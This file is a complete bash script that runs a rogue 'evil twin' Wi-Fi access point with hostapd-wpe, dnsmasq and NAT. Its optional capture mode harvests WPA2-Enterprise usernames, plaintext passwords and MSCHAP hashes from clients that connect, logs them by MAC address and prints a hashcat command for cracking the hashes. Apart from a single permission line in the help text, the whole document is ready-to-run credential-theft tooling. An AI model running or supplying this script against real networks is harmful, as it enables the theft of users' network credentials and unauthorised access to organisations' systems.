#!/usr/bin/env bash
# fake_ap.sh - Create a fake access point with WPA2 password capture
# Enhanced version with hostapd-wpe for credential harvesting
#
# Usage:
#   sudo ./fake_ap.sh SSID CHANNEL UPLINK_IF [WLAN_IF] [--capture-auth]
#     SSID      - Name of fake AP
#     CHANNEL   - WiFi channel to use (e.g., 6 or 11)
#     UPLINK_IF - Interface to share Internet (e.g., eth0) or 'none'
#     WLAN_IF   - (Optional) Wireless interface to use
#     --capture-auth - Enable WPA2 password capture
#
#   sudo ./fake_ap.sh stop
#   sudo ./fake_ap.sh status
#   sudo ./fake_ap.sh --help

# FIX 1: Removed set -euo pipefail — conflicts with intentional || true patterns
#         throughout the script. Using explicit error handling instead.

# ---- Configuration ----
AP_IP="192.168.1.1"
AP_NET="192.168.1.0/24"
DHCP_RANGE_START="192.168.1.2"
DHCP_RANGE_END="192.168.1.50"
DNSMASQ_CONF="/tmp/dnsmasq_fakeap.conf"
HOSTAPD_CONF="/tmp/hostapd_fakeap.conf"
HOSTAPD_WPE_CONF="/tmp/hostapd_wpe_fakeap.conf"
HOSTAPD_LOG="/tmp/hostapd_fakeap.log"
DNSMASQ_LOG="/tmp/dnsmasq_fakeap.log"
DNSMASQ_PIDFILE="/tmp/dnsmasq_fakeap.pid"
HOSTAPD_PIDFILE="/tmp/hostapd_fakeap.pid"
STATE_FILE="/tmp/fakeap_state.txt"
LOCK_FILE="/tmp/fakeap.lock"
AUTH_LOG="/tmp/fakeap_auth_attempts.log"

# FIX 4: Dynamic lease file detection instead of hardcoded path
LEASE_FILE=""
for _lf in /var/lib/misc/dnsmasq.leases \
            /var/lib/dnsmasq/dnsmasq.leases \
            /tmp/dnsmasq.leases; do
    [[ -f "$_lf" ]] && { LEASE_FILE="$_lf"; break; }
done

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log_info() {
    echo -e "${GREEN}[INFO]${NC} $*"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $*"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $*"
}

# FIX 5: Dynamic banner width based on SSID length
print_banner() {
    local msg="  AP '${SSID}' ACTIVE on channel ${CHANNEL}  "
    local width=${#msg}
    local border
    border=$(printf '═%.0s' $(seq 1 $((width))))
    echo -e "${GREEN}╔${border}╗${NC}"
    echo -e "${GREEN}║${msg}║${NC}"
    echo -e "${GREEN}╚${border}╝${NC}"
}

show_help() {
    cat <<EOF
${GREEN}Fake Access Point Manager with WPA2 Password Capture${NC}

Usage:
  sudo $0 SSID CHANNEL UPLINK_IF [WLAN_IF] [--capture-auth]
    SSID           - Fake AP name
    CHANNEL        - WiFi channel (1-14, typically 1, 6, or 11)
    UPLINK_IF      - Interface to share Internet (or 'none')
    WLAN_IF        - (Optional) Wireless interface (auto-detected if omitted)
    --capture-auth - (Optional) Enable WPA2 password capture mode

  sudo $0 stop [UPLINK_IF]
  sudo $0 status
  sudo $0 --help

Examples:
  sudo $0 "FreeWiFi" 6 eth0
  sudo $0 "TestAP" 11 enp1s0 wlan0 --capture-auth
  sudo $0 stop eth0
  sudo $0 status

Notes:
  - For password capture, hostapd-wpe must be installed
  - Run only on hardware/networks you own or have permission to test
  - Requires: hostapd/hostapd-wpe, dnsmasq, iptables, iw
  - Some wireless drivers don't support AP mode
EOF
    exit 0
}

[[ "${1:-}" == "--help" || "${1:-}" == "-h" ]] && show_help

# ---- Parse action/args ----
if [[ "${1:-}" == "stop" ]]; then
    ACTION="stop"
    UPLINK_IF="${2:-none}"
elif [[ "${1:-}" == "status" ]]; then
    ACTION="status"
else
    ACTION="start"
    SSID="${1:-}"
    CHANNEL="${2:-}"
    UPLINK_IF="${3:-}"
    WLAN_IF_ARG="${4:-}"
    CAPTURE_AUTH="false"

    # FIX 6: Only check args from position 4 onwards for --capture-auth
    # so positional args like SSID can't accidentally trigger it
    for arg in "${@:4}"; do
        if [[ "$arg" == "--capture-auth" ]]; then
            CAPTURE_AUTH="true"
        fi
    done
fi

# FIX 2: Root check moved to TOP — before any tool checks or lock acquisition
# Only required for start/stop, not status (status just reads files)
if [[ "$ACTION" != "status" ]] && [[ $EUID -ne 0 ]]; then
    log_error "Run as root: sudo $0 ..."
    exit 1
fi

# ---- Status check ----
if [[ "$ACTION" == "status" ]]; then
    echo -e "${BLUE}=== Fake AP Status ===${NC}"

    if [[ -f "$STATE_FILE" ]]; then
        echo -e "\n${GREEN}Configuration:${NC}"
        cat "$STATE_FILE"
    else
        log_warn "No state file found. Fake AP may not be running."
    fi

    echo -e "\n${GREEN}Process Status:${NC}"
    if [[ -f "$HOSTAPD_PIDFILE" ]]; then
        AP_PID=$(cat "$HOSTAPD_PIDFILE" 2>/dev/null || echo "")
        if [[ -n "$AP_PID" ]] && kill -0 "$AP_PID" 2>/dev/null; then
            log_info "hostapd is running (PID: $AP_PID)"
        else
            log_error "hostapd PID file exists but process is not running"
        fi
    else
        log_warn "hostapd is not running"
    fi

    if [[ -f "$DNSMASQ_PIDFILE" ]]; then
        DNS_PID=$(cat "$DNSMASQ_PIDFILE" 2>/dev/null || echo "")
        if [[ -n "$DNS_PID" ]] && kill -0 "$DNS_PID" 2>/dev/null; then
            log_info "dnsmasq is running (PID: $DNS_PID)"
        else
            log_error "dnsmasq PID file exists but process is not running"
        fi
    else
        log_warn "dnsmasq is not running"
    fi

    echo -e "\n${GREEN}Interface Status:${NC}"
    if [[ -f "$STATE_FILE" ]]; then
        WLAN_IF=$(grep "^WLAN_IF=" "$STATE_FILE" 2>/dev/null | cut -d= -f2 || echo "")
        if [[ -n "$WLAN_IF" ]] && ip link show "$WLAN_IF" >/dev/null 2>&1; then
            ip addr show "$WLAN_IF" | grep -E "inet |UP|DOWN"
        else
            log_warn "Wireless interface not found"
        fi
    fi

    # FIX 4: Use dynamic lease file
    # Re-detect here since LEASE_FILE may not have existed at startup
    for _lf in /var/lib/misc/dnsmasq.leases \
                /var/lib/dnsmasq/dnsmasq.leases \
                /tmp/dnsmasq.leases; do
        [[ -f "$_lf" ]] && { LEASE_FILE="$_lf"; break; }
    done

    if [[ -n "$LEASE_FILE" ]]; then
        echo -e "\n${GREEN}Connected Clients:${NC}"
        awk '{print $2, $3, $4}' "$LEASE_FILE" | column -t
    fi

    if [[ -f "$AUTH_LOG" ]] && [[ -s "$AUTH_LOG" ]]; then
        echo -e "\n${GREEN}Captured Credentials:${NC}"
        grep -E "PASSWORD CAPTURED|MSCHAP Response" "$AUTH_LOG" | tail -10
    fi

    exit 0
fi

# Interactive prompts if starting & missing args
if [[ "$ACTION" == "start" ]]; then
    [[ -z "${SSID:-}" ]]      && read -rp "Enter SSID for fake AP: " SSID
    [[ -z "${CHANNEL:-}" ]]   && read -rp "Enter WiFi channel (e.g. 6): " CHANNEL
    [[ -z "${UPLINK_IF:-}" ]] && read -rp "Enter uplink interface (or 'none'): " UPLINK_IF

    if [[ "$CAPTURE_AUTH" == "false" ]]; then
        read -rp "Enable WPA2 password capture? (y/n): " ENABLE_CAPTURE
        [[ "$ENABLE_CAPTURE" =~ ^[Yy]$ ]] && CAPTURE_AUTH="true"
    fi

    # Validate channel
    if ! [[ "$CHANNEL" =~ ^[0-9]+$ ]] || \
       [ "$CHANNEL" -lt 1 ] || [ "$CHANNEL" -gt 14 ]; then
        log_error "Invalid channel. Must be 1-14."
        exit 1
    fi

    # Validate SSID length (max 32 chars per 802.11 spec)
    if [[ ${#SSID} -gt 32 ]]; then
        log_error "SSID too long (max 32 characters, got ${#SSID})"
        exit 1
    fi
fi

require_cmd() {
    command -v "$1" >/dev/null 2>&1 || {
        log_error "Required command '$1' not found. Install it first."
        exit 2
    }
}

# ---- Required tools ----
for cmd in dnsmasq ip iw sysctl iptables; do
    require_cmd "$cmd"
done

# Check for hostapd or hostapd-wpe
HOSTAPD_CMD=""
if [[ "$CAPTURE_AUTH" == "true" ]]; then
    if command -v hostapd-wpe >/dev/null 2>&1; then
        HOSTAPD_CMD="hostapd-wpe"
        log_info "Using hostapd-wpe for password capture"

        # FIX 8: Validate hostapd-wpe cert files before proceeding
        local_missing=false
        for cert_file in /etc/hostapd-wpe/certs/ca.pem \
                         /etc/hostapd-wpe/certs/server.pem \
                         /etc/hostapd-wpe/certs/server.key \
                         /etc/hostapd-wpe/certs/dh \
                         /etc/hostapd-wpe/hostapd-wpe.eap_user; do
            if [[ ! -f "$cert_file" ]]; then
                log_error "Missing required file: $cert_file"
                local_missing=true
            fi
        done
        if [[ "$local_missing" == "true" ]]; then
            log_error "hostapd-wpe cert/config files missing."
            log_error "Try: sudo apt-get install --reinstall hostapd-wpe"
            exit 2
        fi
    else
        log_error "hostapd-wpe not found. Install: sudo apt-get install hostapd-wpe"
        log_error "Or disable password capture mode."
        exit 2
    fi
else
    if command -v hostapd >/dev/null 2>&1; then
        HOSTAPD_CMD="hostapd"
    else
        log_error "hostapd not found. Install: sudo apt-get install hostapd"
        exit 2
    fi
fi

# ---- Lock file to prevent multiple instances ----
acquire_lock() {
    if [[ -f "$LOCK_FILE" ]]; then
        OLD_PID=$(cat "$LOCK_FILE" 2>/dev/null || echo "")
        if [[ -n "$OLD_PID" ]] && kill -0 "$OLD_PID" 2>/dev/null; then
            log_error "Another instance is already running (PID: $OLD_PID)"
            exit 1
        else
            log_warn "Stale lock file found. Removing."
            rm -f "$LOCK_FILE"
        fi
    fi
    echo $$ > "$LOCK_FILE"
}

release_lock() {
    rm -f "$LOCK_FILE"
}

# ---- Cleanup ----
# FIX 1: Guard against re-entrant calls (EXIT trap + explicit cleanup calls)
_CLEANUP_DONE=false
cleanup() {
    [[ "$_CLEANUP_DONE" == "true" ]] && return
    _CLEANUP_DONE=true

    log_info "Cleaning up..."

    # Stop dnsmasq
    if [[ -f "$DNSMASQ_PIDFILE" ]]; then
        local pid
        pid=$(cat "$DNSMASQ_PIDFILE" 2>/dev/null || true)
        if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then
            log_info "Stopping dnsmasq (PID: $pid)"
            kill "$pid" 2>/dev/null || true
            sleep 1
            kill -9 "$pid" 2>/dev/null || true
        fi
        rm -f "$DNSMASQ_PIDFILE"
    fi
    pkill -f "dnsmasq.*$DNSMASQ_CONF" 2>/dev/null || true

    # Stop hostapd
    if [[ -f "$HOSTAPD_PIDFILE" ]]; then
        local pid
        pid=$(cat "$HOSTAPD_PIDFILE" 2>/dev/null || true)
        if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then
            log_info "Stopping hostapd (PID: $pid)"
            kill "$pid" 2>/dev/null || true
            sleep 1
            kill -9 "$pid" 2>/dev/null || true
        fi
        rm -f "$HOSTAPD_PIDFILE"
    fi
    pkill -f "hostapd.*$HOSTAPD_CONF" 2>/dev/null || true
    pkill -f "hostapd-wpe.*$HOSTAPD_WPE_CONF" 2>/dev/null || true

    # Load saved state for WLAN_IF and UPLINK_IF if not already set
    if [[ -f "$STATE_FILE" ]]; then
        if [[ -z "${UPLINK_IF:-}" || "${UPLINK_IF:-}" == "none" ]]; then
            UPLINK_IF=$(grep "^UPLINK_IF=" "$STATE_FILE" 2>/dev/null | cut -d= -f2 || echo "none")
        fi
        # FIX 2b: Always load WLAN_IF from state in cleanup — it may not be
        # set if cleanup is called before WLAN_IF was assigned (e.g. early exit)
        if [[ -z "${WLAN_IF:-}" ]]; then
            WLAN_IF=$(grep "^WLAN_IF=" "$STATE_FILE" 2>/dev/null | cut -d= -f2 || echo "")
        fi
    fi

    # Restore wireless interface
    if [[ -n "${WLAN_IF:-}" ]] && ip link show "$WLAN_IF" >/dev/null 2>&1; then
        log_info "Restoring wireless interface: $WLAN_IF"
        ip link set "$WLAN_IF" down 2>/dev/null || true
        ip addr flush dev "$WLAN_IF" 2>/dev/null || true
        ip link set "$WLAN_IF" up 2>/dev/null || true
    fi

    # Remove iptables rules if uplink was used
    if [[ -n "${UPLINK_IF:-}" && "${UPLINK_IF:-}" != "none" && -n "${WLAN_IF:-}" ]]; then
        log_info "Removing iptables NAT rules for $UPLINK_IF"
        iptables -t nat -D POSTROUTING -o "$UPLINK_IF" -s "$AP_NET" -j MASQUERADE 2>/dev/null || true
        iptables -D FORWARD -i "$WLAN_IF" -o "$UPLINK_IF" -j ACCEPT 2>/dev/null || true
        iptables -D FORWARD -i "$UPLINK_IF" -o "$WLAN_IF" \
            -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || true
    fi

    # Disable IP forwarding
    sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1 || true

    # Restart network services
    log_info "Restarting network services..."
    systemctl restart NetworkManager 2>/dev/null || true
    systemctl restart wpa_supplicant 2>/dev/null || true

    # Clean up temp files
    rm -f "$DNSMASQ_CONF" "$HOSTAPD_CONF" "$HOSTAPD_WPE_CONF" "$STATE_FILE"
    release_lock

    log_info "Cleanup complete."

    # Show captured credentials if any
    if [[ -f "$AUTH_LOG" ]] && [[ -s "$AUTH_LOG" ]]; then
        echo
        log_warn "=== CAPTURED AUTHENTICATION ATTEMPTS ==="
        cat "$AUTH_LOG"
        echo
        log_info "Full log saved to: $AUTH_LOG"
    fi
}

# ---- STOP action ----
if [[ "$ACTION" == "stop" ]]; then
    cleanup
    exit 0
fi

acquire_lock

# FIX 1: Removed EXIT from trap — only handle INT and TERM
# EXIT trap + cleanup() calling exit = infinite loop / double cleanup
trap 'cleanup; exit 0' INT TERM

# ---- Determine wireless interface ----
if [[ -n "${WLAN_IF_ARG:-}" ]]; then
    WLAN_IF="$WLAN_IF_ARG"
else
    WLAN_IF=$(iw dev 2>/dev/null | awk '/Interface/ {print $2; exit}')
fi

if [[ -z "${WLAN_IF:-}" ]]; then
    log_error "No wireless interface detected. Provide one as the 4th argument."
    log_info "Available: $(ip link show | grep -E '^[0-9]+:' | awk -F': ' '{print $2}' | tr '\n' ' ')"
    cleanup
    exit 3
fi

if ! ip link show "$WLAN_IF" >/dev/null 2>&1; then
    log_error "Interface '$WLAN_IF' does not exist"
    cleanup
    exit 3
fi

# Check AP mode support
if ! iw list 2>/dev/null | grep -A 10 "Supported interface modes" | grep -q "AP"; then
    log_warn "Your wireless card may not support AP mode. Trying anyway..."
fi

log_info "Using wireless interface: $WLAN_IF"
log_info "SSID: '$SSID'   Channel: '$CHANNEL'   Uplink: '$UPLINK_IF'"
[[ "$CAPTURE_AUTH" == "true" ]] && \
    log_warn "Security: WPA2-Enterprise (Password Capture Mode)" || \
    log_info "Security: Open (no password)"

# Save state
cat > "$STATE_FILE" <<EOF
SSID=$SSID
CHANNEL=$CHANNEL
UPLINK_IF=$UPLINK_IF
WLAN_IF=$WLAN_IF
CAPTURE_AUTH=$CAPTURE_AUTH
STARTED=$(date)
EOF

# Initialize auth log
{
    echo "=== Authentication Attempts Log ==="
    echo "Started: $(date)"
    echo "SSID: $SSID"
    [[ "$CAPTURE_AUTH" == "true" ]] && \
        echo "Mode: WPA2 Password Capture ENABLED" || \
        echo "Mode: Open AP"
    echo "========================================"
    echo
} > "$AUTH_LOG"

log_info "Stopping conflicting services..."
systemctl stop NetworkManager 2>/dev/null || true
systemctl stop wpa_supplicant 2>/dev/null || true
pkill wpa_supplicant 2>/dev/null || true

# Prepare wireless interface
log_info "Preparing wireless interface..."
ip link set "$WLAN_IF" down 2>/dev/null || true
sleep 1
ip addr flush dev "$WLAN_IF" 2>/dev/null || true
ip link set "$WLAN_IF" up 2>/dev/null || true

log_info "Configuring $WLAN_IF with IP $AP_IP/24"
ip addr add "$AP_IP/24" dev "$WLAN_IF" 2>/dev/null || true

# Create hostapd config
if [[ "$CAPTURE_AUTH" == "true" ]]; then
    log_info "Creating hostapd-wpe config for WPA2-Enterprise credential capture..."
    HOSTAPD_CONFIG="$HOSTAPD_WPE_CONF"
    cat > "$HOSTAPD_CONFIG" <<EOF
interface=$WLAN_IF
driver=nl80211
ssid=$SSID
channel=$CHANNEL
hw_mode=g
ieee80211n=1
wmm_enabled=1

# WPA2-Enterprise (EAP only - no PSK)
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP

# EAP configuration for capturing credentials
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh

# Logging
logger_syslog=-1
logger_syslog_level=0
logger_stdout=-1
logger_stdout_level=0
EOF
else
    log_info "Creating hostapd config for open network..."
    HOSTAPD_CONFIG="$HOSTAPD_CONF"
    cat > "$HOSTAPD_CONFIG" <<EOF
interface=$WLAN_IF
driver=nl80211
ssid=$SSID
channel=$CHANNEL
hw_mode=g
ieee80211n=1
wmm_enabled=1

# Open network (no authentication)
EOF
fi

# Start hostapd
log_info "Starting $HOSTAPD_CMD..."
nohup $HOSTAPD_CMD "$HOSTAPD_CONFIG" > "$HOSTAPD_LOG" 2>&1 &
HOSTAPD_PID=$!
echo "$HOSTAPD_PID" > "$HOSTAPD_PIDFILE"
sleep 3

if ! kill -0 "$HOSTAPD_PID" 2>/dev/null; then
    log_error "hostapd died unexpectedly. Log:"
    cat "$HOSTAPD_LOG" 2>/dev/null || true
    cleanup
    exit 5
fi
log_info "hostapd started (PID: $HOSTAPD_PID)"

# Create dnsmasq config
log_info "Creating dnsmasq configuration..."
cat > "$DNSMASQ_CONF" <<EOF
interface=$WLAN_IF
bind-interfaces
dhcp-range=${DHCP_RANGE_START},${DHCP_RANGE_END},255.255.255.0,12h
dhcp-option=3,${AP_IP}
dhcp-option=6,${AP_IP}
server=8.8.8.8
server=8.8.4.4
log-queries
log-dhcp
log-facility=${DNSMASQ_LOG}
listen-address=${AP_IP}
dhcp-authoritative
EOF

# FIX 3: Run dnsmasq directly without tee pipe
# Piping through tee meant $! captured tee's PID, not dnsmasq's.
# --pid-file handles PID tracking; stderr goes to log file directly.
log_info "Starting dnsmasq..."
dnsmasq --conf-file="$DNSMASQ_CONF" \
        --pid-file="$DNSMASQ_PIDFILE" \
        2>"$DNSMASQ_LOG"

# FIX 3b: Wait up to 5s for pidfile — dnsmasq writes it asynchronously
local_waited=0
while [[ ! -f "$DNSMASQ_PIDFILE" ]] && [[ $local_waited -lt 5 ]]; do
    sleep 1
    local_waited=$((local_waited + 1))
done

if [[ ! -f "$DNSMASQ_PIDFILE" ]]; then
    log_error "dnsmasq failed to start"
    [[ -f "$DNSMASQ_LOG" ]] && cat "$DNSMASQ_LOG"
    cleanup
    exit 6
fi

DNSMASQ_PID=$(cat "$DNSMASQ_PIDFILE")
log_info "dnsmasq started (PID: $DNSMASQ_PID)"

# Enable NAT and forwarding if uplink provided
if [[ -n "${UPLINK_IF:-}" && "$UPLINK_IF" != "none" ]]; then
    log_info "Enabling NAT and IP forwarding via $UPLINK_IF"

    if ! ip link show "$UPLINK_IF" >/dev/null 2>&1; then
        log_error "Uplink interface '$UPLINK_IF' does not exist"
        cleanup
        exit 7
    fi

    sysctl -w net.ipv4.ip_forward=1 >/dev/null

    iptables -t nat -C POSTROUTING -o "$UPLINK_IF" -s "$AP_NET" -j MASQUERADE 2>/dev/null || \
        iptables -t nat -A POSTROUTING -o "$UPLINK_IF" -s "$AP_NET" -j MASQUERADE

    iptables -C FORWARD -i "$WLAN_IF" -o "$UPLINK_IF" -j ACCEPT 2>/dev/null || \
        iptables -A FORWARD -i "$WLAN_IF" -o "$UPLINK_IF" -j ACCEPT

    iptables -C FORWARD -i "$UPLINK_IF" -o "$WLAN_IF" \
        -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || \
        iptables -A FORWARD -i "$UPLINK_IF" -o "$WLAN_IF" \
        -m state --state RELATED,ESTABLISHED -j ACCEPT

    log_info "NAT configured successfully"
fi

# ---- Display status ----
echo
# FIX 5: Dynamic width banner
print_banner
echo
log_info "Interface:  $WLAN_IF"
log_info "Gateway IP: $AP_IP"
log_info "DHCP Range: ${DHCP_RANGE_START} - ${DHCP_RANGE_END}"
[[ "$UPLINK_IF" != "none" ]] && \
    log_info "Internet:   Shared via $UPLINK_IF" || \
    log_info "Internet:   Not shared (no uplink)"
[[ "$CAPTURE_AUTH" == "true" ]] && \
    log_warn "Security:   WPA2-ENTERPRISE CREDENTIAL CAPTURE ACTIVE" || \
    log_info "Security:   Open (no password)"
echo

if [[ "$CAPTURE_AUTH" == "true" ]]; then
    echo -e "${RED}╔════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  ⚠️  EAP CREDENTIAL CAPTURE MODE ACTIVE  ⚠️       ║${NC}"
    echo -e "${RED}║  Enterprise credentials from EAP handshakes       ║${NC}"
    echo -e "${RED}║  will be logged to: $AUTH_LOG  ${NC}"
    echo -e "${RED}╚════════════════════════════════════════════════════╝${NC}"
fi

echo -e "${YELLOW}Waiting for clients... (Ctrl-C to stop)${NC}"
echo -e "${BLUE}Commands:${NC}"
echo "  sudo $0 status"
echo "  sudo $0 stop ${UPLINK_IF}"
echo "  tail -f $HOSTAPD_LOG"
echo "  tail -f $AUTH_LOG"
echo

# ---- Monitor loop ----
LAST_LEASE_COUNT=0
LAST_LOG_SIZE=0

while true; do
    sleep 3

    # Check hostapd still running
    if [[ -f "$HOSTAPD_PIDFILE" ]]; then
        AP_PID=$(cat "$HOSTAPD_PIDFILE" 2>/dev/null || echo "")
        if [[ -n "$AP_PID" ]] && ! kill -0 "$AP_PID" 2>/dev/null; then
            log_error "hostapd (PID $AP_PID) stopped unexpectedly"
            tail -n 20 "$HOSTAPD_LOG" 2>/dev/null || true
            cleanup
            exit 8
        fi
    fi

    # Check dnsmasq still running
    if [[ -f "$DNSMASQ_PIDFILE" ]]; then
        DNS_PID=$(cat "$DNSMASQ_PIDFILE" 2>/dev/null || echo "")
        if [[ -n "$DNS_PID" ]] && ! kill -0 "$DNS_PID" 2>/dev/null; then
            log_error "dnsmasq (PID $DNS_PID) stopped unexpectedly"
            tail -n 20 "$DNSMASQ_LOG" 2>/dev/null || true
            cleanup
            exit 9
        fi
    fi

    # Monitor hostapd-wpe log for credentials
    if [[ "$CAPTURE_AUTH" == "true" ]] && [[ -f "$HOSTAPD_LOG" ]]; then
        CURRENT_LOG_SIZE=$(wc -l < "$HOSTAPD_LOG" 2>/dev/null || echo "0")
        if [[ $CURRENT_LOG_SIZE -gt $LAST_LOG_SIZE ]]; then
            NEW_LINES=$((CURRENT_LOG_SIZE - LAST_LOG_SIZE))
            LAST_LOG_SIZE=$CURRENT_LOG_SIZE

            tail -n "$NEW_LINES" "$HOSTAPD_LOG" | while IFS= read -r line; do
                TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
                MAC=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -1)

                if echo "$line" | grep -iq "username:"; then
                    USERNAME=$(echo "$line" | sed -n 's/.*username: *\(.*\)/\1/p' \
                        | sed 's/[[:space:]]*$//' | tr -d '\r\n')
                    if [[ -n "$USERNAME" ]]; then
                        echo "[$TIMESTAMP] 👤 USERNAME: $USERNAME" | tee -a "$AUTH_LOG"
                        [[ -n "$MAC" ]] && echo "    From MAC: $MAC" | tee -a "$AUTH_LOG"
                        log_info "👤 Username captured: $USERNAME"
                    fi
                fi

                if echo "$line" | grep -iq "password:"; then
                    PASSWORD_CAPTURED=$(echo "$line" | sed -n 's/.*password: *\(.*\)/\1/p' \
                        | sed 's/[[:space:]]*$//' | tr -d '\r\n')
                    if [[ -n "$PASSWORD_CAPTURED" ]]; then
                        echo "[$TIMESTAMP] 🔑 PASSWORD CAPTURED: $PASSWORD_CAPTURED" | tee -a "$AUTH_LOG"
                        [[ -n "$MAC" ]] && echo "    From MAC: $MAC" | tee -a "$AUTH_LOG"
                        echo >> "$AUTH_LOG"
                        log_warn "════════════════════════════════════════"
                        log_warn "🔑 PASSWORD: $PASSWORD_CAPTURED"
                        log_warn "📱 MAC: ${MAC:-Unknown}"
                        log_warn "════════════════════════════════════════"
                    fi
                fi

                if echo "$line" | grep -iq "mschap.*challenge\|mschap.*response"; then
                    echo "[$TIMESTAMP] 🔓 MSCHAP attempt" | tee -a "$AUTH_LOG"
                    echo "$line" >> "$AUTH_LOG"
                    [[ -n "$MAC" ]] && echo "    From MAC: $MAC" | tee -a "$AUTH_LOG"
                    HASH=$(echo "$line" | grep -oE '[0-9a-fA-F]{48,}' | head -1)
                    if [[ -n "$HASH" ]]; then
                        echo "    Hash: $HASH" >> "$AUTH_LOG"
                        echo "    Crack with: hashcat -m 5500 hash.txt wordlist.txt" >> "$AUTH_LOG"
                        log_info "🔓 Hash captured from ${MAC:-Unknown}"
                    fi
                    echo >> "$AUTH_LOG"
                fi

                if echo "$line" | grep -iq "AP-STA-CONNECTED" && [[ -n "$MAC" ]]; then
                    echo "[$TIMESTAMP] ✅ $MAC connected" | tee -a "$AUTH_LOG"
                    log_info "✅ $MAC connected"
                fi

                if echo "$line" | grep -iq "WPA.*4-Way.*M1\|WPA.*4-Way.*M3" && [[ -n "$MAC" ]]; then
                    echo "[$TIMESTAMP] 🔐 $MAC attempting auth..." | tee -a "$AUTH_LOG"
                    log_info "🔐 $MAC entering password..."
                fi

                if echo "$line" | grep -iq "authentication.*failed\|AP-STA-DISCONNECTED" && [[ -n "$MAC" ]]; then
                    echo "[$TIMESTAMP] ❌ $MAC failed/disconnected" | tee -a "$AUTH_LOG"
                    log_warn "❌ $MAC failed or disconnected"
                fi
            done
        fi
    fi

    # FIX 4 + FIX 7: Use dynamic lease file, fix LAST_LEASE_COUNT update order
    # Re-detect lease file each loop iteration in case it appeared after startup
    [[ -z "$LEASE_FILE" ]] && for _lf in /var/lib/misc/dnsmasq.leases \
                                          /var/lib/dnsmasq/dnsmasq.leases \
                                          /tmp/dnsmasq.leases; do
        [[ -f "$_lf" ]] && { LEASE_FILE="$_lf"; break; }
    done

    if [[ -n "$LEASE_FILE" ]] && [[ -f "$LEASE_FILE" ]]; then
        CURRENT_LEASE_COUNT=$(wc -l < "$LEASE_FILE")
        if [[ $CURRENT_LEASE_COUNT -gt $LAST_LEASE_COUNT ]]; then
            # FIX 7: Calculate diff BEFORE updating LAST_LEASE_COUNT
            local_new=$((CURRENT_LEASE_COUNT - LAST_LEASE_COUNT))
            LAST_LEASE_COUNT=$CURRENT_LEASE_COUNT

            log_info "New client(s) connected:"
            tail -n "$local_new" "$LEASE_FILE" | \
                awk '{printf "  MAC: %s  IP: %s  Hostname: %s\n", $2, $3, $4}'

            if [[ "$CAPTURE_AUTH" == "true" ]]; then
                tail -n "$local_new" "$LEASE_FILE" | \
                    awk -v ts="$(date '+%Y-%m-%d %H:%M:%S')" \
                    '{printf "[%s] DHCP: MAC=%s IP=%s Host=%s\n", ts, $2, $3, $4}' \
                    >> "$AUTH_LOG"
            fi
        fi
    fi
done